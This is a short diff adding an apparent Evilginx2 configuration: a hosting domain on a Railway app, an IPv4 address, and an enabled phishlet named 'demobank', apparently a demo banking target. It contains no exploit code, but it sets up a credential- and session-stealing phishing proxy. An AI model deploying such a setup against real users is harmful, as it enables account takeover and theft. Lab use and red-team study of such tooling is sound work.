@@ -1,0 +1,7 @@
+domain: "docker-evilginx2-production.up.railway.app"
+ipv4: "151.101.2.15"
+phishlets:
+  demobank:
+    hostname: "docker-evilginx2-production.up.railway.app"
+    enabled: true
+
